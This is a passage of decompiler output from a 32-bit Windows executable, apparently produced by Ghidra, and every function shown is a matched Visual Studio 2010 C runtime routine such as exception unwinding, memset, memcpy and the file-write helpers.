  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



/* Function: _EH4_GlobalUnwind2 */

/* Library Function - Single Match
    @_EH4_GlobalUnwind2@8
   
   Library: Visual Studio 2010 Release
   __fastcall _EH4_GlobalUnwind2,8 */

void __fastcall _EH4_GlobalUnwind2(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  RtlUnwind(param_1,(PVOID)0x40c2f6,param_2,(PVOID)0x0);
  return;
}



/* Function: _EH4_LocalUnwind */

/* Library Function - Single Match
    @_EH4_LocalUnwind@16
   
   Library: Visual Studio 2010 Release
   __fastcall _EH4_LocalUnwind,16 */

void __fastcall _EH4_LocalUnwind(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



/* Function: terminate */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* Library Function - Single Match
    void __cdecl terminate(void)
   
   Library: Visual Studio 2010 Release */

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    /* WARNING: Subroutine does not return */
  _abort();
}



/* Function: FUN_0040c34b */

void FUN_0040c34b(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



/* Function: _inconsistency */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* Library Function - Single Match
    void __cdecl _inconsistency(void)
   
   Library: Visual Studio 2010 Release */

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(DAT_0041b8ec);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_0040c396 */

void FUN_0040c396(void)

{
  DAT_0041b8ec = EncodePointer(terminate);
  return;
}



/* Function: FUN_0040c3a7 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __cdecl FUN_0040c3a7(undefined4 param_1)

{
  _DAT_0041b8f0 = param_1;
  return;
}



/* Function: __initp_misc_cfltcvt_tab */

/* Library Function - Single Match
    __initp_misc_cfltcvt_tab
   
   Library: Visual Studio 2010 Release */

void __initp_misc_cfltcvt_tab(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&PTR_LAB_00419470 + uVar2));
    *(PVOID *)((int)&PTR_LAB_00419470 + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



/* Function: __ValidateImageBase */

/* Library Function - Single Match
    __ValidateImageBase
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)((short)*(int *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



/* Function: __FindPESection */

/* Library Function - Single Match
    __FindPESection
   
   Library: Visual Studio 2010 Release */

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



/* Function: __IsNonwritableInCurrentImage */

/* Library Function - Single Match
    __IsNonwritableInCurrentImage
   
   Library: Visual Studio 2010 Release */

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_004191b4 ^ 0x417cd0;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



/* Function: ___crtMessageBoxW */

/* Library Function - Single Match
    ___crtMessageBoxW
   
   Library: Visual Studio 2010 Release */

int __cdecl ___crtMessageBoxW(LPCWSTR _LpText,LPCWSTR _LpCaption,UINT _UType)

{
  HMODULE hModule;
  FARPROC pFVar1;
  code *pcVar2;
  code *pcVar3;
  int iVar4;
  undefined1 local_28 [4];
  LPCWSTR local_24;
  LPCWSTR local_20;
  PVOID local_1c;
  int local_18;
  undefined1 local_14 [8];
  byte local_c;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_24 = _LpText;
  local_20 = _LpCaption;
  local_1c = (PVOID)FUN_00409846();
  local_18 = 0;
  if (DAT_0041b8f4 == (PVOID)0x0) {
    hModule = LoadLibraryW(L"USER32.DLL");
    if ((hModule == (HMODULE)0x0) ||
       (pFVar1 = GetProcAddress(hModule,"MessageBoxW"), pFVar1 == (FARPROC)0x0)) goto LAB_0040c689;
    DAT_0041b8f4 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_0041b8f8 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_0041b8fc = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,"GetUserObjectInformationW");
    DAT_0041b904 = EncodePointer(pFVar1);
    if (DAT_0041b904 != (PVOID)0x0) {
      pFVar1 = GetProcAddress(hModule,"GetProcessWindowStation");
      DAT_0041b900 = EncodePointer(pFVar1);
    }
  }
  if ((DAT_0041b900 == local_1c) || (DAT_0041b904 == local_1c)) {
LAB_0040c638:
    if ((((DAT_0041b8f8 != local_1c) &&
         (pcVar2 = (code *)DecodePointer(DAT_0041b8f8), pcVar2 != (code *)0x0)) &&
        (local_18 = (*pcVar2)(), local_18 != 0)) &&
       ((DAT_0041b8fc != local_1c &&
        (pcVar2 = (code *)DecodePointer(DAT_0041b8fc), pcVar2 != (code *)0x0)))) {
      local_18 = (*pcVar2)(local_18);
    }
  }
  else {
    pcVar2 = (code *)DecodePointer(DAT_0041b900);
    pcVar3 = (code *)DecodePointer(DAT_0041b904);
    if (((pcVar2 == (code *)0x0) || (pcVar3 == (code *)0x0)) ||
       (((iVar4 = (*pcVar2)(), iVar4 != 0 &&
         (iVar4 = (*pcVar3)(iVar4,1,local_14,0xc,local_28), iVar4 != 0)) && ((local_c & 1) != 0))))
    goto LAB_0040c638;
    _UType = _UType | 0x200000;
  }
  pcVar2 = (code *)DecodePointer(DAT_0041b8f4);
  if (pcVar2 != (code *)0x0) {
    (*pcVar2)(local_18,local_24,local_20,_UType);
  }
LAB_0040c689:
  iVar4 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



/* Function: _wcscat_s */

/* Library Function - Single Match
    _wcscat_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  errno_t eStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)pwVar3 - (int)_Src;
        do {
          wVar1 = *_Src;
          *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eStack_10 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040c6b7;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040c6b7:
  FUN_004087f3();
  return eStack_10;
}



/* Function: _wcsncpy_s */

/* Library Function - Single Match
    _wcsncpy_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  rsize_t rVar5;
  errno_t eStack_14;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_0040c733:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          rVar5 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            iVar4 = (int)_Dst - (int)_Src;
            do {
              wVar1 = *_Src;
              *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar5 = rVar5 - 1;
            } while (rVar5 != 0);
          }
          else {
            pwVar3 = _Dst;
            do {
              wVar1 = *(wchar_t *)(((int)_Src - (int)_Dst) + (int)pwVar3);
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              if ((wVar1 == L'\0') || (rVar5 = rVar5 - 1, rVar5 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar5 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          eStack_14 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0040c744;
        }
        *_Dst = L'\0';
      }
    }
  }
  else if (_Dst != (wchar_t *)0x0) goto LAB_0040c733;
  piVar2 = __errno();
  eStack_14 = 0x16;
  *piVar2 = 0x16;
LAB_0040c744:
  FUN_004087f3();
  return eStack_14;
}



/* Function: _wcslen */

/* Library Function - Single Match
    _wcslen
   
   Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2015 Release,
   Visual Studio 2019 Release */

size_t __cdecl _wcslen(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  return ((int)pwVar2 - (int)_Str >> 1) - 1;
}



/* Function: __set_error_mode */

/* Library Function - Single Match
    __set_error_mode
   
   Library: Visual Studio 2010 Release */

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar1 = DAT_0041ab84;
      DAT_0041ab84 = _Mode;
      return iVar1;
    }
    if (_Mode == 3) {
      return DAT_0041ab84;
    }
  }
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_004087f3();
  return -1;
}



/* Function: _memset */

/* Library Function - Single Match
    _memset
   
   Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release */

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined1 (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0x7f < _Size)) && (DAT_0041ebdc != 0)) {
    pauVar2 = __VEC_memzero((undefined1 (*) [16])_Dst,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



/* Function: FID_conflict:_memcpy */

/* Library Function - Multiple Matches With Different Base Names
    _memcpy
    _memmove
   
   Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release */

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040ca9f_caseD_2;
        case 3:
          goto switchD_0040ca9f_caseD_3;
        }
        goto switchD_0040ca9f_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040ca9f_caseD_0;
      case 1:
        goto switchD_0040ca9f_caseD_1;
      case 2:
        goto switchD_0040ca9f_caseD_2;
      case 3:
        goto switchD_0040ca9f_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040ca9f_caseD_2;
            case 3:
              goto switchD_0040ca9f_caseD_3;
            }
            goto switchD_0040ca9f_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040ca9f_caseD_2;
            case 3:
              goto switchD_0040ca9f_caseD_3;
            }
            goto switchD_0040ca9f_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040ca9f_caseD_2;
            case 3:
              goto switchD_0040ca9f_caseD_3;
            }
            goto switchD_0040ca9f_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040ca9f_caseD_1:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040ca9f_caseD_2:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040ca9f_caseD_3:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar1 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar1 + 2);
      *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040ca9f_caseD_0:
    return _Dst;
  }
  if (((0x7f < _Size) && (DAT_0041ebdc != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = FUN_00407a5f(_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040c919_caseD_2;
      case 3:
        goto switchD_0040c919_caseD_3;
      }
      goto switchD_0040c919_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040c919_caseD_0;
    case 1:
      goto switchD_0040c919_caseD_1;
    case 2:
      goto switchD_0040c919_caseD_2;
    case 3:
      goto switchD_0040c919_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        *(undefined1 *)((int)_Dst + 1) = *(undefined1 *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined1 *)((int)_Dst + 2) = *(undefined1 *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c919_caseD_2;
          case 3:
            goto switchD_0040c919_caseD_3;
          }
          goto switchD_0040c919_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined1 *)((int)_Dst + 1) = *(undefined1 *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c919_caseD_2;
          case 3:
            goto switchD_0040c919_caseD_3;
          }
          goto switchD_0040c919_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    /* WARNING: Load size is inaccurate */
        *(undefined1 *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    /* WARNING: Load size is inaccurate */
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c919_caseD_2;
          case 3:
            goto switchD_0040c919_caseD_3;
          }
          goto switchD_0040c919_caseD_1;
        }
      }
    }
  }
  switch(uVar2) {
  case 7:
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 6:
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 5:
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 4:
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 3:
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 2:
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 1:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040c919_caseD_1:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040c919_caseD_2:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    *(undefined1 *)((int)puVar1 + 1) = *(undefined1 *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040c919_caseD_3:
                    /* WARNING: Load size is inaccurate */
    *(undefined1 *)puVar1 = *_Src;
    *(undefined1 *)((int)puVar1 + 1) = *(undefined1 *)((int)_Src + 1);
    *(undefined1 *)((int)puVar1 + 2) = *(undefined1 *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040c919_caseD_0:
  return _Dst;
}



/* Function: __lseeki64_nolock */

/* Library Function - Single Match
    __lseeki64_nolock
   
   Library: Visual Studio 2010 Release */

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040cc52:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0040cc52;
      }
    }
    pbVar1 = (byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



/* Function: __lseeki64 */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __lseeki64
   
   Library: Visual Studio 2010 Release */

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041eaa8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_0040cd86();
        goto LAB_0040cd80;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004087f3();
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0040cd80:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



/* Function: FUN_0040cd86 */

void FUN_0040cd86(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



/* Function: __write_nolock */

/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */
/* Library Function - Single Match
    __write_nolock
   
   Library: Visual Studio 2010 Release */

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  char cVar1;
  wchar_t *pwVar2;
  WCHAR WVar3;
  wchar_t wVar4;
  ulong *puVar5;
  int *piVar6;
  int iVar7;
  _ptiddata p_Var8;
  BOOL BVar9;
  DWORD nNumberOfBytesToWrite;
  WCHAR *pWVar10;
  int iVar11;
  uint uVar12;
  int unaff_EBX;
  WCHAR *pWVar13;
  uint uVar14;
  int iVar15;
  ushort uVar16;
  uint local_1ae8;
  WCHAR *local_1ae4;
  int *local_1ae0;
  uint local_1adc;
  WCHAR *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  uint local_1acc;
  char local_1ac5;
  uint local_1ac4;
  DWORD local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = 0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0040d47f;
  if (_Buf == (void *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004087f3();
    goto LAB_0040d47f;
  }
  piVar6 = &DAT_0041eac0 + (_FileHandle >> 5);
  iVar11 = (_FileHandle & 0x1fU) * 0x40;
  local_1ac5 = (char)(*(char *)(*piVar6 + 0x24 + iVar11) * '\x02') >> 1;
  local_1ae0 = piVar6;
  if (((local_1ac5 == '\x02') || (local_1ac5 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004087f3();
    goto LAB_0040d47f;
  }
  if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EBX);
  }
  iVar7 = __isatty(_FileHandle);
  if ((iVar7 == 0) || ((*(byte *)(iVar11 + 4 + *piVar6) & 0x80) == 0)) {
LAB_0040d110:
    if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x80) == 0) {
      BVar9 = WriteFile(*(HANDLE *)(*piVar6 + iVar11),local_1ad0,_MaxCharCount,&local_1adc,
                        (LPOVERLAPPED)0x0);
      if (BVar9 == 0) {
LAB_0040d3f1:
        local_1ac0 = GetLastError();
      }
      else {
        local_1ac0 = 0;
        local_1acc = local_1adc;
      }
LAB_0040d3fd:
      if (local_1acc != 0) goto LAB_0040d47f;
      goto LAB_0040d406;
    }
    local_1ac0 = 0;
    if (local_1ac5 == '\0') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0040d43c;
      do {
        uVar14 = 0;
        uVar12 = (int)pWVar13 - (int)local_1ad0;
